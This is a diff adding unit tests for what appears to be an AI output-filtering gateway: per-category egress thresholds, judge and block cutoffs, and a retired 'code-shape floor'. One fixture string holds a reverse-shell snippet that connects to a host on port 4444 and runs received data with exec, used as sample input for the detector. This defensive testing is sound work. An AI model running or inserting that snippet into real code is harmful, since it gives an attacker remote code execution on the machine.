@@ -271,5 +271,70 @@ class PerCategoryThresholdTests(unittest.TestCase):
             self.assertEqual(api._load_thresholds(Path(directory)), {})
 
 
+class EgressThresholdTests(unittest.TestCase):
+    """Per-category egress operating points, and the code-shape floor's retirement."""
+
+    EGRESS = {
+        "malicious_code": {"judge": 0.6942, "block": 0.9859},
+        "toxicity_harm": {"judge": 0.9358, "block": 0.9646},
+    }
+    CODE = "import socket\ns = socket.socket()\ns.connect((host, 4444))\nwhile True:\n    exec(s.recv(1024))"
+
+    def setUp(self):
+        saved_in, saved_eg = api._THRESHOLDS, api._EGRESS_THRESHOLDS
+        def restore():
+            api._THRESHOLDS, api._EGRESS_THRESHOLDS = saved_in, saved_eg
+        self.addCleanup(restore)
+
+    def scores(self, **overrides):
+        base = dict.fromkeys(
+            ["prompt_injection", "system_prompt_leakage", "malicious_code",
+             "toxicity_harm", "adversarial_obfuscation"], 0.01,
+        )
+        base.update(overrides)
+        return base
+
+    def test_absent_egress_thresholds_preserve_the_old_path(self):
+        api._EGRESS_THRESHOLDS = {}
+        # Sparse cap holds malicious_code at 0.88 — it could never hard-block.
+        self.assertAlmostEqual(
+            api._aggregate_response(self.scores(malicious_code=0.99)), api.SPARSE_CAP, places=4,
+        )
+
+    def test_malicious_code_response_can_block_with_thresholds(self):
+        api._EGRESS_THRESHOLDS = self.EGRESS
+        self.assertGreaterEqual(
+            api._aggregate_response(self.scores(malicious_code=0.99)), api.GATEWAY_BLOCK,
+        )
+
+    def test_ordinary_prose_toxicity_no_longer_escalates_on_egress(self):
+        # 0.58 is about the mean toxicity_harm score on benign held-out responses;
+        # under the old mitigated max it escalated, which is why 55% of benign
+        # responses were being sent to the judge.
+        api._EGRESS_THRESHOLDS = {}
+        self.assertGreaterEqual(api._aggregate_response(self.scores(toxicity_harm=0.58)), api.GATEWAY_JUDGE)
+        api._EGRESS_THRESHOLDS = self.EGRESS
+        self.assertLess(api._aggregate_response(self.scores(toxicity_harm=0.58)), api.GATEWAY_JUDGE)
+
+    def test_code_shape_floor_still_applies_without_egress_thresholds(self):
+        api._EGRESS_THRESHOLDS = {}
+        floored = api._apply_code_shape_floor(self.CODE, self.scores(malicious_code=0.01))
+        self.assertAlmostEqual(floored["malicious_code"], api.SPARSE_TRIGGER, places=6)
+
+    def test_code_shape_floor_is_retired_once_egress_thresholds_exist(self):
+        api._EGRESS_THRESHOLDS = self.EGRESS
+        scores = self.scores(malicious_code=0.01)
+        self.assertIs(api._apply_code_shape_floor(self.CODE, scores), scores)
+
+    def test_ingress_aggregate_is_unaffected_by_egress_thresholds(self):
+        api._THRESHOLDS, api._EGRESS_THRESHOLDS = {}, self.EGRESS
+        self.assertAlmostEqual(api._aggregate(self.scores(malicious_code=0.62)), 0.62, places=4)
+
+    def test_only_response_relevant_heads_drive_the_egress_aggregate(self):
+        api._EGRESS_THRESHOLDS = self.EGRESS
+        # prompt_injection is input-framed and must not move an egress verdict.
+        self.assertLess(api._aggregate_response(self.scores(prompt_injection=1.0)), api.GATEWAY_JUDGE)
+
+
 if __name__ == "__main__":
     unittest.main()
